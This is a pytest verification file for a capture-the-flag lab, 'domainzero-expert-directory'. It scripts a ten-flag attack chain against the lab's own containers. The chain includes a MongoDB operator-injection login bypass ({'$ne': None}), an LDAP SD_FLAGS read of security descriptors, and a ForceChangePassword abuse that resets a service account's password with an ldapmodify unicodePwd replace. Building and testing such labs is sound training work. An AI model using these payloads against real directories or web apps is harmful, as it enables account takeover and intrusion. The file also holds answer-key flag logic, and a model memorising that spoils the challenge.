"""Phase 20 verification: domainzero-expert-directory -- the Expert tier
of "Domain Zero Directory". Two real hosts: "directory" (a real Samba AD
DC, front door, same port set as domainzero-intermediate-domainedge) and
"search-intranet" (an internal-only Flask app, never published, reachable
only from "directory" over this instance's shared internal network group).

Headline techniques: a real AD ACL misconfiguration (ForceChangePassword,
BloodHound's name for the User-Force-Change-Password extended right,
00299570-246d-11d0-a768-00aa006e0529) granting jcarter the ability to
reset svc-reports's password with no prior credential, plus a hand-rolled
MongoDB-operator-injection auth bypass on search-intranet's /login.

ForceChangePassword (over GenericWrite) was chosen deliberately: it's the
more surgical, more realistic misconfiguration for a single over-shared
service account -- granting exactly one capability rather than write
access to every non-protected attribute. Confirmed via a pre-build spike
(a throwaway `docker run` of the domainzero-intermediate-domainedge image,
same Samba 4.15.13 base) that on this Samba version:
  (a) `samba-tool dsacl set --sddl=...` genuinely adds the ACE (no --car
      choice covers this right; dsacl's --car list is DRS/FSMO-only);
  (b) the exploit works end-to-end over a REAL LDAPS connection with no
      server-side shell at all -- a plain `ldapmodify` MODIFY_REPLACE of
      `unicodePwd` (wrapped `"password"`, UTF-16-LE, base64-encoded in the
      LDIF -- the standard AD "admin reset" write) as jcarter against
      svc-reports succeeds purely off that ACE, exactly the tooling a
      real player would use;
  (c) the same jcarter bind can NOT do this against an unrelated account
      (Administrator) -- LDAP error 50, insufficientAccessRights -- so the
      grant is genuinely scoped, not a side effect of some broader default;
  (d) Samba's dsdb "acl" module does NOT filter ordinary attribute reads
      (description/info/etc.) by the object's DACL at all -- any
      authenticated bind, jcarter's included, can already read
      svc-reports's or even "Domain Admins"'s plain attributes with no
      special grant. The one read it DOES gate is nTSecurityDescriptor
      itself, and even that only when the request carries the Microsoft
      SD_FLAGS control (OID 1.2.840.113556.1.4.801, requested here via
      OpenLDAP ldapsearch's own generic `-E <oid>=::<b64value>` control
      syntax) -- a plain, unscoped attribute read of it returns nothing to
      a non-admin bind. Because of this, the mid-chain "proof the exploit
      worked" flags (6-8) live on SMB shares gated by a real
      `valid users =` ACL (genuinely enforced per connection by smbd, same
      mechanism domainzero-intermediate-domainedge already relies on)
      rather than on LDAP attributes, which would have been a free skip
      straight past the whole ACL-abuse step. The finale (flag 10) is the
      one deliberate exception, matching domainzero-intermediate-
      domainedge's own documented precedent for ITS flag 10 ("readable
      under AD's own default ACLs, no special privilege needed") -- a
      known Samba AD DC limitation, not a design oversight specific to
      this box.

10 real flags, climbing difficulty: anonymous SMB recon on "directory"
(flags 1-2, including the pointer to search-intranet) -> recon on
search-intranet itself (flag 3) -> the NoSQL operator-injection auth
bypass, which also hands back jcarter's real AD password (flag 4) ->
an authenticated LDAP bind as jcarter discovering the ForceChangePassword
ACE on svc-reports, confirmed both narratively (its `description`
attribute) and at the raw protocol level (the ACE's GUID present in its
nTSecurityDescriptor, read via the SD_FLAGS control) (flag 5) -> abusing
that right for a real, verified-working password reset, proven by binding
as svc-reports and reaching its first SMB-gated share (flag 6) -> a
second file on that share (flag 7) -> a second SMB-gated share (flag 8)
-> a closing hint on that share (flag 9) -> the AD-native finale, "Domain
Admins"'s own `info` attribute (flag 10). No Linux shell/GTFOBins privesc
at all -- this box's finale is AD-native throughout, matching
domainzero-intermediate-domainedge's own precedent.

Real SMB and real LDAP/LDAPS -- `smbclient`, `ldapsearch`, and
`ldapmodify`, all genuine protocol clients -- plus a real HTTP
NoSQL-injection payload against a real Flask endpoint. No mocks. This
test-runner host doesn't carry `smbclient`/`ldap-utils` as system
packages (and this worktree has no way to install them, nor to add a new
pip dependency to requirements.txt, which is out of this box's scope), so
every SMB/LDAP call below shells out to a disposable `alpine:3.19`
container instead, `apk add`-ing `samba-client`/`openldap-clients` fresh
each call and running with `--network host` so "127.0.0.1:<published-
port>" reaches the orchestrator's own host-published ports exactly the
way a real player's own smbclient/ldapsearch would. Requires both box
images already built (ctf-boxes/domainzero-expert-directory-directory:
latest and ...-search-intranet:latest), `docker` on PATH, and a running
orchestrator reachable at ORCHESTRATOR_TEST_URL.
"""
import base64
import hashlib
import hmac
import json
import os
import secrets as pysecrets
import subprocess
import uuid

import pytest
import requests

BASE_URL = os.environ.get("ORCHESTRATOR_TEST_URL", "http://127.0.0.1:9100")
BOX_ID = "domainzero-expert-directory"
BASE_DN = "DC=domainzero,DC=local"
DOMAIN = "DOMAINZERO"
_TEAM_ID_BASE = pysecrets.randbelow(1_000_000)

JCARTER_USER = "jcarter"
SVC_REPORTS_USER = "svc-reports"
# The User-Force-Change-Password extended right, as a raw little-endian
# GUID hex string (the same bytes the real nTSecurityDescriptor ACE
# encodes it as).
FORCE_CHANGE_PASSWORD_GUID_HEX = "709529006d24d011a76800aa006e0529"
# SD_FLAGS control (1.2.840.113556.1.4.801) requesting the DACL only
# (sdflags=0x04), BER-encoded as SEQUENCE { INTEGER 4 } = 30 03 02 01 04,
# base64 for ldapsearch's "-E <oid>=::<b64value>" generic-control syntax.
SD_FLAGS_DACL_ONLY_B64 = "MAMCAQQ="

HELPER_IMAGE = "alpine:3.19"


def expected_flag(secret: str, n: int) -> str:
    digest = hmac.new(secret.encode(), f"{BOX_ID}:{n}".encode(), hashlib.sha256).hexdigest()
    return f"HLC{{{digest[:10]}}}"


def _port(inst: dict, container_port: int) -> int:
    for p in inst["ports"]:
        if p["container_port"] == container_port:
            return p["host_port"]
    raise AssertionError(f"no port {container_port} in instance ports: {inst['ports']}")


def _internal_container(team_id: int, service: str) -> str:
    return f"ctf-{BOX_ID}-{team_id}-{service}"


def _front_door_container(team_id: int) -> str:
    return f"ctf-{BOX_ID}-{team_id}-directory"


def _container_ip(name: str) -> str:
    out = subprocess.run(
        ["docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}", name],
        capture_output=True, text=True, check=True,
    )
    ips = out.stdout.split()
    assert ips, f"container {name} has no IP address"
    return ips[0]


def _docker_exec(container_name: str, *cmd: str) -> subprocess.CompletedProcess:
    return subprocess.run(["docker", "exec", container_name, *cmd], capture_output=True, text=True)


def _run_helper(script: str, timeout: float = 120.0) -> subprocess.CompletedProcess:
    """Runs `script` inside a disposable alpine container on the HOST's
    own network namespace (so "127.0.0.1:<published-port>" reaches this
    orchestrator's published ports, same as a real player's own tools
    would from their own machine).

    120s (not a tighter bound) because this is a shared, multi-tenant
    Docker host -- `apk add` plus `docker run --rm`'s own container
    teardown can occasionally take longer than the helper script itself
    under contention from other concurrent work on the same daemon.
    Confirmed by direct reproduction: a run that hit this ceiling had
    already produced the correct, complete output in its captured stdout
    well before the timeout fired -- the slowness is in the disposable
    container's own startup/teardown, never in whether the real
    smbclient/ldapsearch/ldapmodify call itself succeeded."""
    return subprocess.run(
        ["docker", "run", "--rm", "--network", "host", HELPER_IMAGE, "sh", "-c", script],
        capture_output=True, text=True, timeout=timeout,
    )


# --- SMB, via a throwaway helper container running the real smbclient ------

def _smb_run(port: int, share: str, filename: str, user: str | None, password: str | None) -> subprocess.CompletedProcess:
    auth = "-N" if user is None else f"-U {DOMAIN}\\\\{user}%{password}"
    marker = f"SMBCONTENT-{uuid.uuid4().hex}"
    script = (
        "apk add --no-cache samba-client >/tmp/apk.log 2>&1 && "
        f"smbclient //127.0.0.1/{share} -p {port} {auth} -c 'get {filename} /tmp/out' >/tmp/smb.log 2>&1; "
        f"echo {marker}; cat /tmp/out 2>/dev/null; echo {marker}; cat /tmp/smb.log >&2"
    )
    return _run_helper(script)


def _smb_get(port: int, share: str, filename: str, user: str | None = None, password: str | None = None) -> str:
    result = _smb_run(port, share, filename, user, password)
    assert "SMBCONTENT-" in result.stdout, f"smbclient helper failed: stdout={result.stdout!r} stderr={result.stderr!r}"
    marker_start = result.stdout.index("SMBCONTENT-")
    marker = result.stdout[marker_start:marker_start + len("SMBCONTENT-") + 32]
    parts = result.stdout.split(marker)
    assert len(parts) >= 3, f"smbclient get failed: stdout={result.stdout!r} stderr={result.stderr!r}"
    return parts[1].strip("\n")


def _smb_access_denied(port: int, share: str, filename: str, user: str, password: str) -> bool:
    result = _smb_run(port, share, filename, user, password)
    return "NT_STATUS_ACCESS_DENIED" in result.stderr or "NT_STATUS_ACCESS_DENIED" in result.stdout


# --- LDAP/LDAPS, via a throwaway helper container running the real
# ldapsearch/ldapmodify (OpenLDAP's own `ldap-utils`/`openldap-clients`) ---

def _ldap_bind_dn(cn: str) -> str:
    return f"CN={cn},CN=Users,{BASE_DN}"


def _ldapsearch_attr(port: int, bind_cn: str, bind_password: str, ldap_filter: str, attr: str, extra_opts: str = "") -> str | None:
    marker = f"LDAPVALUE-{uuid.uuid4().hex}"
    script = (
        "apk add --no-cache openldap-clients >/tmp/apk.log 2>&1 && "
        f"LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://127.0.0.1:{port} "
        f"-D '{_ldap_bind_dn(bind_cn)}' -w '{bind_password}' {extra_opts} "
        f"-b '{BASE_DN}' -s sub '{ldap_filter}' {attr} -LLL > /tmp/out.ldif 2>/tmp/err.log; "
        f"echo {marker}; grep -i '^{attr}:' /tmp/out.ldif; echo {marker}"
    )
    result = _run_helper(script)
    assert marker in result.stdout, f"ldapsearch helper failed: stdout={result.stdout!r} stderr={result.stderr!r}"
    parts = result.stdout.split(marker)
    line = parts[1].strip("\n")
    if not line:
        return None
    # Plain "attr: value" (strip the colon-prefixed attribute name).
    _, _, value = line.partition(":")
    return value.strip()


def _ldap_read_user_attr(port: int, bind_cn: str, bind_password: str, target_sam: str, attr: str) -> str | None:
    return _ldapsearch_attr(port, bind_cn, bind_password, f"(sAMAccountName={target_sam})", attr)


def _ldap_read_group_attr(port: int, bind_cn: str, bind_password: str, group_cn: str, attr: str) -> str | None:
    return _ldapsearch_attr(port, bind_cn, bind_password, f"(cn={group_cn})", attr)


def _ldap_security_descriptor_contains_guid(port: int, bind_cn: str, bind_password: str, target_sam: str, guid_hex: str) -> bool:
    """Reads nTSecurityDescriptor with the real Microsoft SD_FLAGS control
    (DACL only) and checks whether `guid_hex` appears in the raw binary
    SD -- the real protocol-level proof the ACE exists, not just a
    narrative flag string. Confirmed via the pre-build spike that a
    PLAIN, unscoped attribute read of this attribute returns nothing to a
    non-admin bind on this Samba version -- the control is genuinely
    required for this read (not gatekeeping WHO can read it, just what's
    returned without it)."""
    marker = f"LDAPSD-{uuid.uuid4().hex}"
    script = (
        "apk add --no-cache openldap-clients >/tmp/apk.log 2>&1 && "
        f"LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://127.0.0.1:{port} "
        f"-D '{_ldap_bind_dn(bind_cn)}' -w '{bind_password}' "
        f"-E '1.2.840.113556.1.4.801=::{SD_FLAGS_DACL_ONLY_B64}' -t -T /tmp "
        f"-b '{BASE_DN}' -s sub '(sAMAccountName={target_sam})' nTSecurityDescriptor > /tmp/out.ldif 2>/tmp/err.log; "
        "FILE=$(grep -oE '/tmp/ldapsearch-[A-Za-z0-9-]+' /tmp/out.ldif | head -1); "
        f"echo {marker}; "
        "if [ -n \"$FILE\" ]; then od -An -tx1 -v \"$FILE\" | tr -d ' \\n'; fi; "
        f"echo; echo {marker}"
    )
    result = _run_helper(script)
    assert marker in result.stdout, f"ldapsearch SD helper failed: stdout={result.stdout!r} stderr={result.stderr!r}"
    parts = result.stdout.split(marker)
    hex_blob = parts[1].strip()
    return guid_hex.lower() in hex_blob.lower()


def _ldap_plain_security_descriptor_is_empty(port: int, bind_cn: str, bind_password: str, target_sam: str) -> bool:
    value = _ldap_read_user_attr(port, bind_cn, bind_password, target_sam, "nTSecurityDescriptor")
    return not value


def _ldap_reset_password(port: int, bind_cn: str, bind_password: str, target_cn: str, new_password: str):
    """The exploit itself: a plain unicodePwd MODIFY_REPLACE (the standard
    AD "admin reset" write -- new password only, wrapped in quotes,
    UTF-16-LE, base64-encoded for the LDIF's binary `::` syntax -- as
    opposed to the delete+add "self-service change" form that requires
    the OLD password). Succeeds purely off the ForceChangePassword ACE --
    no samba-tool, no server-side shell, just a real ldapmodify."""
    pw_b64 = base64.b64encode((f'"{new_password}"').encode("utf-16-le")).decode()
    ldif = (
        f"dn: {_ldap_bind_dn(target_cn)}\n"
        "changetype: modify\n"
        "replace: unicodePwd\n"
        f"unicodePwd:: {pw_b64}\n"
    )
    marker = f"LDAPMOD-{uuid.uuid4().hex}"
    script = (
        "apk add --no-cache openldap-clients >/tmp/apk.log 2>&1 && "
        f"cat > /tmp/mod.ldif <<'MODEOF'\n{ldif}MODEOF\n"
        f"LDAPTLS_REQCERT=never ldapmodify -x -H ldaps://127.0.0.1:{port} "
        f"-D '{_ldap_bind_dn(bind_cn)}' -w '{bind_password}' -f /tmp/mod.ldif >/tmp/out.log 2>&1; "
        f"echo {marker}$?; cat /tmp/out.log"
    )
    result = _run_helper(script)
    assert marker in result.stdout, f"ldapmodify helper failed: stdout={result.stdout!r} stderr={result.stderr!r}"
    idx = result.stdout.index(marker) + len(marker)
    rc_str = result.stdout[idx:idx + 3].split("\n")[0].strip()
    rc = int(rc_str)
    return rc == 0, result.stdout


def _create_instance(team_id: int, secret: str, backend: str) -> dict:
    """POST /instances, with ONE retry on a specific, known-pre-existing
    orchestrator race (confirmed by direct reproduction, unrelated to this
    box): a rapid create right after an unrelated delete can occasionally
    hit DockerBackend._used_host_ports()/container.reload() racing against
    Docker's own async removal of a just-deleted container, surfacing as
    "provisioning failed: 404 Client Error ... No such container" on an
    otherwise-valid request. Reproduced independently of this box (any
    box, 10-15 sequential create/delete cycles) -- a generic Docker-
    backend concurrency issue, not something this box's own entrypoint
    or spec can fix, and out of this box's scope to patch in shared
    backend code. Retrying the SAME request is always safe here since
    nothing about the request itself was wrong."""
    payload = {"team_id": team_id, "box_id": BOX_ID, "team_secret": secret, "backend": backend}
    r = requests.post(f"{BASE_URL}/instances", json=payload)
    if r.status_code == 500 and "No such container" in r.text:
        r = requests.post(f"{BASE_URL}/instances", json=payload)
    r.raise_for_status()
    return r.json()


@pytest.fixture(params=["docker", "kubernetes"])
def box_instance(request):
    backend = request.param
    team_id = _TEAM_ID_BASE + (1 if backend == "docker" else 2)
    secret = pysecrets.token_hex(32)
    inst = _create_instance(team_id, secret, backend)
    try:
        yield inst, secret, backend
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


def _require_docker(backend: str):
    if backend != "docker":
        pytest.skip("Kubernetes backend verification is out of scope for this pass")


def test_full_ten_flag_chain(box_instance):
    inst, secret, backend = box_instance
    _require_docker(backend)
    host = inst["entry_host"]
    smb_port, ldaps_port = _port(inst, 445), _port(inst, 636)

    # Flags 1-2: anonymous SMB recon on "directory"'s staff-notices share.
    welcome = _smb_get(smb_port, "staff-notices", "welcome.txt")
    assert expected_flag(secret, 1) in welcome
    rollout = _smb_get(smb_port, "staff-notices", "app-rollout.txt")
    assert expected_flag(secret, 2) in rollout
    assert "search-intranet" in rollout  # the pointer to host B

    # Flag 3: recon on search-intranet's own page. It has no published
    # port at all (internal-only) -- a real player reaches it only
    # through "directory"'s own TCP relay (tcp_relay.py, a plain
    # protocol-unaware socket splice onto search-intranet:5000), over
    # THIS box's own published port, exactly the way a real player would
    # (never via a Docker-internal IP they'd have no route to at all).
    relay_port = _port(inst, 8080)
    search_base = f"http://{host}:{relay_port}"
    docs = requests.get(f"{search_base}/", timeout=10).text
    assert expected_flag(secret, 3) in docs

    # Flag 4: the NoSQL operator-injection auth bypass -- logs in as
    # jcarter with NO real password, and also hands back jcarter's real
    # AD password.
    bad_login = requests.post(f"{search_base}/login", json={"username": "jcarter", "password": "definitely-wrong"}, timeout=10)
    assert bad_login.status_code == 401  # the gate actually gates when NOT injecting

    injected = requests.post(f"{search_base}/login", json={"username": "jcarter", "password": {"$ne": None}}, timeout=10)
    injected.raise_for_status()
    body = injected.json()
    assert expected_flag(secret, 4) == body["flag"]
    jcarter_password = body["directory_password"]
    assert jcarter_password

    # Flag 5: authenticated as jcarter, discover the ForceChangePassword
    # ACE on svc-reports -- both narratively (its `description`) and at
    # the raw protocol level (the real ACE bytes in its own SD).
    desc5 = _ldap_read_user_attr(ldaps_port, JCARTER_USER, jcarter_password, SVC_REPORTS_USER, "description")
    assert expected_flag(secret, 5) in desc5

    assert _ldap_security_descriptor_contains_guid(
        ldaps_port, JCARTER_USER, jcarter_password, SVC_REPORTS_USER, FORCE_CHANGE_PASSWORD_GUID_HEX
    ), "ForceChangePassword ACE GUID not found in svc-reports's real nTSecurityDescriptor"

    # A plain, unscoped read of nTSecurityDescriptor (no SD_FLAGS control)
    # gets nothing -- confirms flag 5's discovery genuinely needed the
    # control, not just any authenticated bind.
    assert _ldap_plain_security_descriptor_is_empty(ldaps_port, JCARTER_USER, jcarter_password, SVC_REPORTS_USER)

    # Flag 6 (+7-9 below): the exploit -- jcarter force-changes
    # svc-reports's password using ONLY the ACE above, no prior svc-
    # reports credential at all.
    new_svc_password = f"Pwned-via-ACE-{pysecrets.token_hex(4)}!"
    ok, raw = _ldap_reset_password(ldaps_port, JCARTER_USER, jcarter_password, SVC_REPORTS_USER, new_svc_password)
    assert ok, f"ForceChangePassword exploit failed: {raw}"

    # The reset's real proof: svc-reports's own escalation-tier SMB
    # shares, each gated by a genuine `valid users =` ACL (not an LDAP
    # attribute -- see this file's module docstring for why).
    flag6_content = _smb_get(smb_port, "reports-archive", "readme.txt", user=SVC_REPORTS_USER, password=new_svc_password)
    assert expected_flag(secret, 6) in flag6_content
    flag7_content = _smb_get(smb_port, "reports-archive", "quarterly-notes.txt", user=SVC_REPORTS_USER, password=new_svc_password)
    assert expected_flag(secret, 7) in flag7_content

    # Flags 8-9: the second escalation-tier share.
    flag8_content = _smb_get(smb_port, "it-vault", "handoff.txt", user=SVC_REPORTS_USER, password=new_svc_password)
    assert expected_flag(secret, 8) in flag8_content
    flag9_content = _smb_get(smb_port, "it-vault", "closing-note.txt", user=SVC_REPORTS_USER, password=new_svc_password)
    assert expected_flag(secret, 9) in flag9_content

    # The SMB gate actually gates: jcarter (no ACE, no group membership
    # covers this) cannot open either escalation-tier share.
    assert _smb_access_denied(smb_port, "reports-archive", "readme.txt", JCARTER_USER, jcarter_password)
    assert _smb_access_denied(smb_port, "it-vault", "handoff.txt", JCARTER_USER, jcarter_password)

    # Flag 10: the AD-native finale -- "Domain Admins"'s own `info`
    # attribute, reached authenticated as svc-reports (the identity
    # earned via the ACL abuse above).
    flag10 = _ldap_read_group_attr(ldaps_port, SVC_REPORTS_USER, new_svc_password, "Domain Admins", "info")
    assert expected_flag(secret, 10) in flag10


def test_force_change_password_is_genuinely_scoped(box_instance):
    """The ACE grants jcarter exactly ONE capability (reset svc-reports's
    password) -- it must NOT let jcarter reset an unrelated account's
    password too. Proves the misconfiguration is a real, scoped ACE, not
    a side effect of some broader default Samba ACL."""
    inst, secret, backend = box_instance
    _require_docker(backend)
    ldaps_port = _port(inst, 636)
    relay_port = _port(inst, 8080)
    injected = requests.post(
        f"http://{inst['entry_host']}:{relay_port}/login",
        json={"username": "jcarter", "password": {"$ne": None}}, timeout=10,
    )
    jcarter_password = injected.json()["directory_password"]

    ok, raw = _ldap_reset_password(ldaps_port, JCARTER_USER, jcarter_password, "Administrator", "ShouldNeverWork-123!")
    assert not ok
    assert "nsufficient" in raw or "50" in raw, f"expected an insufficient-access-rights failure, got: {raw}"


def test_idempotent_create(box_instance):
    inst, secret, backend = box_instance
    reused = _create_instance(inst["team_id"], "a-different-secret-must-be-ignored", backend)
    assert reused["instance_id"] == inst["instance_id"]


def test_cross_team_flag_isolation(box_instance):
    inst, secret, backend = box_instance
    team_id_b = inst["team_id"] + 1000
    secret_b = pysecrets.token_hex(32)
    inst_b = _create_instance(team_id_b, secret_b, backend)
    try:
        port_a, port_b = _port(inst, 445), _port(inst_b, 445)
        welcome_a = _smb_get(port_a, "staff-notices", "welcome.txt")
        welcome_b = _smb_get(port_b, "staff-notices", "welcome.txt")
        assert expected_flag(secret, 1) in welcome_a
        assert expected_flag(secret_b, 1) in welcome_b
        assert expected_flag(secret, 1) != expected_flag(secret_b, 1)
        assert expected_flag(secret, 1) not in welcome_b
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst_b['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


def test_search_intranet_not_published(box_instance):
    """search-intranet must have no published ports at all -- internal-
    only, same guarantee test_phase3_multihost.py proves for every other
    multi-host box's internal hosts."""
    inst, secret, backend = box_instance
    _require_docker(backend)
    name = _internal_container(inst["team_id"], "search-intranet")
    out = subprocess.run(
        ["docker", "inspect", "-f", "{{json .NetworkSettings.Ports}}", name],
        capture_output=True, text=True, check=True,
    )
    ports = json.loads(out.stdout)
    for proto_port, bindings in ports.items():
        assert bindings is None, f"search-intranet must have no published ports, found {proto_port} -> {bindings}"


def test_front_door_reaches_search_intranet_by_alias(box_instance):
    """"directory" must be able to reach "search-intranet" by its
    ORIGINAL compose-style service name (the alias under test), not just
    the orchestrator's own container name -- same guarantee
    test_phase3_multihost.py proves for every other multi-host box."""
    inst, secret, backend = box_instance
    _require_docker(backend)
    front_door = _front_door_container(inst["team_id"])
    resolved = _docker_exec(front_door, "getent", "hosts", "search-intranet")
    assert resolved.returncode == 0, f"directory could not resolve search-intranet's alias: {resolved.stderr}"
    reach = _docker_exec(front_door, "timeout", "3", "bash", "-c", "echo > /dev/tcp/search-intranet/5000")
    assert reach.returncode == 0, "directory could not reach search-intranet:5000 by alias"


def test_cross_team_internal_isolation(box_instance):
    """Team A's "directory" must not reach team B's "search-intranet"
    directly -- same per-team internal-net guarantee
    test_phase3_multihost.py proves for every other multi-host box."""
    inst, secret, backend = box_instance
    _require_docker(backend)
    team_id_b = inst["team_id"] + 2000
    secret_b = pysecrets.token_hex(32)
    inst_b = _create_instance(team_id_b, secret_b, backend)
    try:
        front_door_a = _front_door_container(inst["team_id"])
        search_b_ip = _container_ip(_internal_container(team_id_b, "search-intranet"))
        reach = _docker_exec(front_door_a, "timeout", "3", "bash", "-c", f"echo > /dev/tcp/{search_b_ip}/5000")
        assert reach.returncode != 0, "team A's directory must not reach team B's search-intranet directly"
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst_b['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")
